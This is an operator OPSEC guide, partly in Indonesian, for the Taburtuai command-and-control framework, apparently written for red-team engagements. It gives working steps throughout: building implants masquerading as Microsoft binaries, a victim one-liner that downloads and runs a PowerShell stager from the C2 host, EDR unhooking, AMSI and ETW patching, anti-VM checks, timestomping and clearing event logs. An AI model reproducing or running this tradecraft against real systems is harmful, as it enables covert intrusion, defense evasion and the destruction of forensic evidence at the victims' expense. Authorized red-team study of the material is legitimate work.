# OPSEC Guide

Operational security practices for running engagements with Taburtuai C2 without getting caught or causing unintended damage.

---

## OPSEC Profiles — Panduan Lengkap

### Quick Reference

| Profile | Interval | Jitter | Working Hours | Sleep Mask | Anti-Debug/VM | Exec Method | Garble | Untuk |
|---------|----------|--------|---------------|------------|---------------|-------------|--------|-------|
| `default` | 10s | 20% | off | off | off | cmd | off | Lab, VM, testing |
| `aggressive` | 5s | 10% | off | off | off | cmd | off | Speed-focused, no EDR |
| `opsec` | 60s | 30% | off | on | on | powershell | off | Produksi umum, EDR ada |
| `stealth` | 300s | 50% | off | on | on | wmi | on* | Lingkungan dimonitor |
| `paranoid` | 600s | 50% | 09:00–17:00 | on | on | mshta | on* | SOC+EDR, target kritis |

> *`obfuscate: true` membutuhkan `garble` terinstall: `go install mvdan.cc/garble@latest`

---

### Cara Kerja Setiap Fitur

**Sleep Masking** (`sleep_masking: true`)
Agent memanggil `VirtualProtect` untuk menandai region memori tempat key enkripsi sebagai `PAGE_NOACCESS` selama sleep. Jika EDR melakukan memory scan saat agent tidur, encryption key tidak terbaca. Aktif di semua profile kecuali `default` dan `aggressive`.

**Anti-Debug / Anti-VM** (`enable_vm_check`, `enable_sandbox_check`, `enable_debug_check`)
Agent menjalankan tiga pengecekan sebelum beacon pertama:
- `checkCPUIDHypervisor()` — eksekusi `wmic computersystem get model`, cek kata kunci `virtual`, `vmware`, `vbox`, `hyper-v`, dll.
- `checkVMRegistryKeys()` — cek registry VMware Tools, VirtualBox Guest Additions, Hyper-V Guest Parameters
- `checkVMProcesses()` — scan proses: `vmtoolsd.exe`, `vboxservice.exe`, dll.
- `nativeDetectDebugger()` — `IsDebuggerPresent` + parent process check

Jika terdeteksi → agent exit silently (tidak ada output, tidak ada error).

> **Penting**: Profile dengan `enable_vm_check: true` TIDAK akan jalan di VM. Gunakan `--profile default` saat testing di VMware/VirtualBox/Hyper-V.

**Working Hours** (`working_hours_only: true`)
Agent cek jam lokal victim sebelum setiap beacon. Di luar jam kerja, agent tidur sampai jam mulai berikutnya. Command yang di-queue tetap tersimpan di server — akan dieksekusi saat jam aktif.

**Exec Method** — cara agent spawn sub-process untuk eksekusi command:
- `cmd` — `cmd.exe /c <command>` — paling simpel, paling terdeteksi
- `powershell` — `powershell.exe -EncodedCommand <base64>` — lebih stealth, command ter-encode
- `wmi` — spawn via `wmic.exe process call create` — parent process adalah WMI host, bukan agent
- `mshta` — spawn via `mshta.exe` LOLBin — banyak digunakan AV whitelist

**Garble Obfuscation** (`obfuscate: true`)
Compile dengan `garble` yang merandominasi nama fungsi, variabel, dan string di binary. Mencegah signature-based detection berbasis nama simbol. Membutuhkan `garble` di PATH.

---

### Profile `default` — Lab & Testing

**Kapan dipakai:** VM lab, testing fitur, demo, target tanpa EDR.

**Yang perlu diketahui:**
- Beacon setiap 10 detik → agent selalu responsif
- Tidak ada evasion → AKAN terdeteksi di lingkungan produksi
- Tidak ada VM check → bisa jalan di VM
- Tidak ada garble → binary lebih kecil, compile lebih cepat

**Step-by-step:**

```bash
# 1. Build agent
./bin/generate stageless \
  --c2 https://172.23.0.118:8443 \
  --key $ENCRYPTION_KEY \
  --profile default \
  --no-gui \
  --arch amd64 \
  --insecure-tls \
  --output ./builds/agent.exe
```

Expected output:
```
[*] Using profile: default
[*] Compiling agent (amd64/windows)...
[+] Stageless implant : builds/agent.exe
    Size              : 11353 KB
    SHA256            : <hash>
    MD5               : <hash>
    Build time        : ~1s
```

```bash
# 2. Upload ke server
./bin/generate upload ./builds/agent.exe \
  --server https://172.23.0.118:8443 \
  --desc "lab-default" \
  --insecure
```

Expected:
```
[+] Stage uploaded
    Token    : <32-char hex>
    Stage URL: https://172.23.0.118:8443/stage/payload
    Format   : exe/amd64
    TTL      : 24h
```

```bash
# 3. Generate PS1 stager
./bin/generate stager \
  --server https://172.23.0.118:8443 \
  --key $ENCRYPTION_KEY \
  --token <token_dari_upload> \
  --format ps1 \
  --output stager.ps1
```

```bash
# 4. Kirim ke victim (host PS1 via HTTP)
python3 -m http.server 8000
# Di victim: powershell -ep bypass -c "iex(iwr http://172.23.0.118:8000/stager.ps1)"
```

```bash
# 5. Tunggu check-in (~30-120 detik pre-beacon delay)
./bin/operator --server https://172.23.0.118:8443 console --insecure
```

```
[172.23.0.118:8443] ❯ agents list
[+] Found 1 agent(s)

AGENT ID                             HOSTNAME        USERNAME   STATUS   LAST SEEN
c7253aea-346...                      DESKTOP-XYZ     John       online   2026-04-26 05:35:21
```

---

### Profile `opsec` — Produksi Umum

**Kapan dipakai:** Target produksi dengan AV/EDR standar (Defender, Trend Micro, dll.), tanpa SOC aktif. Engagement umum.

**Yang perlu diketahui:**
- Beacon 60s ±30% jitter → tiap request tiba antara 42–78 detik
- Anti-VM/debugger aktif → TIDAK bisa jalan di VM
- Sleep masking aktif → key terlindungi saat agent tidur
- `exec_method: powershell` → command dikodekan Base64
- Perlu bare-metal atau VM yang bersih (tanpa VM tools)

**Step-by-step:**

```bash
# 1. Server HARUS distart dengan PROFILE yang cocok (atau default)
# Jika mau C2 traffic terlihat seperti Office365, start server dengan:
PROFILE=office365 ENCRYPTION_KEY=$ENCRYPTION_KEY TLS_ENABLED=true ./bin/server

# Atau tanpa C2 profile (pakai default routing):
ENCRYPTION_KEY=$ENCRYPTION_KEY TLS_ENABLED=true ./bin/server
```

```bash
# 2. Build agent — TARGET BUKAN VM
./bin/generate stageless \
  --c2 https://172.23.0.118:8443 \
  --key $ENCRYPTION_KEY \
  --profile opsec \
  --masq-company "Microsoft Corporation" \
  --masq-desc "Windows Security Health Service" \
  --masq-orig "SecurityHealthService.exe" \
  --kill-date 2026-06-30 \
  --no-gui \
  --arch amd64 \
  --insecure-tls \
  --output ./builds/SecurityHealthService.exe
```

Expected:
```
[*] Using profile: opsec
[*] Compiling agent (amd64/windows)...
[+] Stageless implant : builds/SecurityHealthService.exe
    Size              : 11354 KB
    Build time        : ~1.1s
```

```bash
# 3. Upload + stager (sama seperti default)
./bin/generate upload ./builds/SecurityHealthService.exe \
  --server https://172.23.0.118:8443 \
  --desc "prod-opsec" \
  --insecure

./bin/generate stager \
  --server https://172.23.0.118:8443 \
  --key $ENCRYPTION_KEY \
  --token <token> \
  --format ps1 \
  --output stager.ps1
```

```bash
# 4. Setelah agent masuk, jalankan evasion sequence dulu
[172.23.0.118:8443] ❯ agents list
[+] Found 1 agent(s)
AGENT ID    HOSTNAME        STATUS
abc123...   WORKSTATION01   online

[172.23.0.118:8443] ❯ opsec antivm abc123
[+] Anti-VM check: clean

[172.23.0.118:8443] ❯ evasion unhook abc123
[+] EDR hooks removed

[172.23.0.118:8443] ❯ bypass amsi abc123
[+] AMSI patched
```

> Setelah `evasion unhook` + `bypass amsi`, baru aman eksekusi command berbahaya.

---

### Profile `stealth` — Lingkungan Dimonitor

**Kapan dipakai:** Target dengan EDR berat (CrowdStrike, SentinelOne), ada tim blue team aktif, atau NDR monitoring traffic.

**Yang perlu diketahui:**
- Beacon 300s ±50% jitter → tiap request tiba antara **2.5–7.5 menit** → tunggu lama!
- `working_hours_only: false` (di YAML), tapi bisa dioverride — cek profile
- `exec_method: wmi` → command spawn via WMI host (parent process bukan agent)
- `obfuscate: true` → perlu garble di PATH
- Garble membuat compile lebih lama (~30–60 detik) dan binary lebih besar
- Shell command `--timeout` HARUS diperbesar: `--timeout 600` minimum

**Step-by-step:**

```bash
# 0. Install garble dulu (hanya sekali)
go install mvdan.cc/garble@latest
garble version
# Expected: garble v0.x.x ...
```

```bash
# 1. Build dengan stealth profile
./bin/generate stageless \
  --c2 https://172.23.0.118:8443 \
  --key $ENCRYPTION_KEY \
  --profile stealth \
  --kill-date 2026-06-30 \
  --no-gui \
  --arch amd64 \
  --insecure-tls \
  --output ./builds/wuauclt_upd.exe
```

Expected (lebih lama karena garble):
```
[*] Using profile: stealth
[*] Compiling agent (amd64/windows)...
[+] Stageless implant : builds/wuauclt_upd.exe
    Size              : ~8-12 MB
    Build time        : 30–60s
```

```bash
# 2. Upload + stager (sama seperti sebelumnya)
# 3. Setelah PS1 jalan di victim, TUNGGU hingga 3 menit untuk check-in pertama
```

```
# 4. Di operator console — gunakan timeout besar untuk setiap command
[172.23.0.118:8443] ❯ agents list
abc123...   WORKSTATION01   online   (last seen mungkin sudah beberapa menit lalu)

[172.23.0.118:8443] ❯ shell abc123 "whoami" --timeout 600
# Tunggu hingga 10 menit (beacon interval + eksekusi)
[+] Result: CORP\jsmith

[172.23.0.118:8443] ❯ shell abc123 "hostname" --timeout 600
[+] Result: WORKSTATION01
```

> **Penting:** Dengan interval 300s ±50%, command yang dikirim mungkin baru dieksekusi 5+ menit kemudian. Normal — agent aktif tapi sedang tidur.

---

### Profile `paranoid` — SOC + EDR Berat

**Kapan dipakai:** Target dengan SOC 24/7, EDR enterprise (CrowdStrike Falcon, Defender for Endpoint), network monitoring aktif, atau target high-value.

**Yang perlu diketahui:**
- Beacon 600s ±50% jitter → tiap request tiba antara **5–15 menit**
- `working_hours_only: true`, jam **09:00–17:00** waktu lokal victim
- Di luar jam itu, agent tidak beacon sama sekali
- `exec_method: mshta` — spawn via `mshta.exe` (Microsoft HTML Application Host)
- Wajib garble
- Shell timeout HARUS `--timeout 900`+
- Jangan pakai di VM — anti-VM akan kill agent

**Step-by-step:**

```bash
# 1. Build dengan paranoid profile
./bin/generate stageless \
  --c2 https://c2.example.com \
  --key $ENCRYPTION_KEY \
  --profile paranoid \
  --kill-date 2026-06-30 \
  --no-gui \
  --arch amd64 \
  --output ./builds/MicrosoftEdgeUpdate.exe
```

```bash
# 2. Deploy ke victim saat jam KERJA (09:00–17:00 waktu victim)
# Jika deploy di luar jam tersebut, agent akan berjalan tapi tidak beacon sampai jam 09:00
```

```
# 3. Cek agent — mungkin tidak langsung muncul
[172.23.0.118:8443] ❯ agents list
[!] No agents found
# Normal jika deploy di luar jam kerja

# Coba lagi besok pagi jam 09:30:
[172.23.0.118:8443] ❯ agents list
[+] Found 1 agent(s)
AGENT ID    HOSTNAME    STATUS
abc123...   DC01        online
```

```
# 4. Setiap command butuh timeout besar
[172.23.0.118:8443] ❯ shell abc123 "net user" --timeout 900
# Bisa tunggu 15+ menit
```

---

### Ringkasan: Kapan Pakai Apa

| Situasi | Profile |
|---------|---------|
| Testing di lab VM sendiri | `default` |
| Engagement CTF tanpa EDR | `aggressive` |
| Engagement dengan Defender/AV standar | `opsec` |
| Target produksi dengan EDR, tidak ada SOC | `stealth` |
| Target high-value, SOC aktif, EDR enterprise | `paranoid` |

### Aturan Penting yang Sering Salah

1. **C2 Profile ≠ OPSEC Profile** — `--c2-profile office365` di agent butuh server distart dengan `PROFILE=office365`. Kalau tidak cocok, agent beacon ke URL yang tidak terdaftar → 404 → exit. Untuk testing, jangan pakai `--c2-profile`.

2. **Anti-VM membunuh agent di VM** — Profile `opsec`/`stealth`/`paranoid` punya `enable_vm_check: true`. Untuk testing di VMware/VirtualBox, WAJIB pakai `--profile default`.

3. **Working hours menyebabkan agent "hilang"** — Profile `paranoid` hanya beacon jam 09–17. Kalau cek `agents list` jam 20:00, agent terlihat `dormant` — ini normal.

4. **Beacon interval butuh timeout besar** — `stealth` (300s) dan `paranoid` (600s) butuh `--timeout` yang sesuai di setiap shell command, bukan default 30s.

---

## Before Deployment

### Choose the Right Profile

Don't deploy with the `default` profile in a monitored environment. Match the profile to the target's network posture:

| Target Environment | Recommended Profile | Traffic Profile |
|-------------------|-------------------|-----------------|
| Internal lab, no EDR | `default` | Any |
| Corporate with basic AV | `opsec` | `cdn` or `jquery` |
| Corporate with EDR (Defender, CrowdStrike) | `stealth` | `office365` or `slack` |
| SOC-monitored, mature security | `paranoid` | `ocsp` with domain fronting |

### Build Uniqueness

Every build should use a different per-binary config:
```bash
# Different output name, realistic masquerade for each target
./bin/taburtuai-generate stageless \
  --c2 https://c2.example.com \
  --key changeme \
  --masq-company "Microsoft Corporation" \
  --masq-desc "Windows Defender Advanced Threat Protection" \
  --masq-orig "MsSense.exe" \
  --no-gui \
  --output ./builds/target_corp_$(date +%Y%m%d).exe
```

Log the SHA256 of each build so you know which binary is deployed where.

### Set a Kill Date

Always set a kill date matching your engagement end:
```bash
--kill-date 2026-05-31
```

### Test Before Deploying

In your own lab:
1. Run the agent and verify it checks in
2. Run `opsec antidebug` and `opsec antivm` to ensure checks pass
3. Test each technique you plan to use
4. Verify the agent connects through the intended traffic profile

---

## During the Engagement

### Evasion First Sequence

Every time you start a new session on a fresh agent (especially on a monitored host), run in this order:

```
1. opsec antidebug <id>    → verify not in sandbox
2. opsec antivm <id>       → verify not in a detonation VM
3. evasion unhook <id>     → remove EDR's userland hooks
4. bypass amsi <id>        → patch AMSI
5. bypass etw <id>         → suppress ETW
→  Now proceed with your techniques
```

### Sleeping Between Actions

On slow beacon targets, the agent naturally sleeps. On fast-beacon agents (default/aggressive), consider manually triggering obfuscated sleep between noisy operations:

```
❯ evasion sleep a1b2 --duration 120
```

This encrypts memory and sleeps for 2 minutes — a gap in telemetry that makes your activity timeline harder to reconstruct.

### Avoid These Patterns

| Action | Why Risky | Alternative |
|--------|-----------|------------|
| `CreateRemoteThread` injection | #1 most-flagged API sequence | Use `mapinject` or `stomp` |
| Spawning `powershell.exe` with encoded command | Extremely common malware pattern | PS runspace (`--method ps-runspace`) |
| Killing AV process | Requires SYSTEM, generates immediate alert | AMSI/ETW bypass instead |
| Writing to `C:\Windows\Temp\` | Heavily monitored directory | Use legitimate-looking paths in AppData, ProgramData |
| Drop PE on disk then execute | On-disk file scanning | Use fileless injection or in-memory exec |
| Command-line with long Base64 | Pattern-matched by EDR | Fragment the payload or use stage delivery |

### Naming Conventions

Name every dropped file after a legitimate Windows binary:
- `MicrosoftEdgeUpdate.exe` (in `C:\ProgramData\Microsoft\EdgeUpdate\`)
- `OneDriveStandaloneUpdater.exe` (in `C:\Program Files\Microsoft OneDrive\`)
- `GoogleCrashHandler.exe` (in `C:\Program Files\Google\Update\`)

Name persistence registry values after legitimate ones:
- `OneDrive`, `SecurityHealth`, `Teams`, `MicrosoftEdgeAutoLaunch_...`

### Timestomp Every Dropped File

```
❯ timestomp a1b2 "C:\ProgramData\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" \
    --ref "C:\Windows\System32\svchost.exe"
```

Do this immediately after any upload, before the file's new timestamp is captured in any log.

### Minimum Footprint

Don't deploy every capability you have — only what's needed for the engagement objective:
- Initial access: just the agent, no tools dropped yet
- Local priv esc: only after confirming current privileges are insufficient
- Credential access: only after evasion is applied
- Lateral movement: only after verifying the target exists and is reachable
- Cleanup as you go — don't leave tools on disk any longer than needed

---

## Covert Channel Selection

| Channel | Best For | Avoid When |
|---------|----------|-----------|
| HTTP (default) | Internal C2, lab | Monitored egress, no internet from target |
| HTTPS | Public internet C2 | Certificate inspection is active (use pinning) |
| DNS-over-HTTPS | Egress-locked networks | DoH is blocked (rare) |
| ICMP | Minimal detection, needs routing | ICMP filtering at perimeter |
| SMB Named Pipe | Lateral-only C2 (no internet needed) | Target doesn't run SMB service |

### Beacon Timing Recommendations

| Environment | Interval | Jitter |
|-------------|----------|--------|
| Home lab / training | 10–30s | 20% |
| Corporate (light monitoring) | 60s | 30% |
| Corporate (EDR present) | 120–300s | 40% |
| SOC + NDR + EDR | 300–600s | 50% |

The higher the monitoring maturity, the slower you beacon. A 5-minute interval with 50% jitter generates beacons randomly between 2.5 and 7.5 minutes apart — extremely difficult to detect via traffic analysis.

---

## Cleanup

At the end of every engagement, in reverse order of deployment:

```
# 1. Remove persistence
❯ persistence remove a1b2 --method registry_run --name "WindowsUpdate"

# 2. Delete dropped files
❯ cmd a1b2 "del C:\ProgramData\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"

# 3. Remove registry modifications
❯ registry delete a1b2 HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -V UseLogonCredential

# 4. Clear event logs (if authorized — discuss with client first)
❯ cmd a1b2 "wevtutil cl System"
❯ cmd a1b2 "wevtutil cl Security"
❯ cmd a1b2 "wevtutil cl Application"

# 5. Terminate the agent
❯ cmd a1b2 "taskkill /f /pid <agent-pid>"

# 6. Remove agent record from C2 server
❯ agents delete a1b2

# 7. Shut down C2 server or rotate infrastructure
```

**Note on log clearing:** Clearing Windows event logs is itself a high-confidence indicator (Event ID 1102). Only do this if explicitly authorized and part of the engagement scope. Many clients prefer you leave logs intact for their own forensic review.

---

## Infrastructure Hygiene

- Use a VPS or redirector between the operator machine and the C2 server — never expose your actual IP
- Terminate engagement infrastructure immediately at end of engagement
- Use Let's Encrypt certs with a domain that looks legitimate (not `evil-c2.xyz`)
- Rotate encryption keys between engagements
- Never reuse agent builds across different engagements — per-engagement builds with unique keys
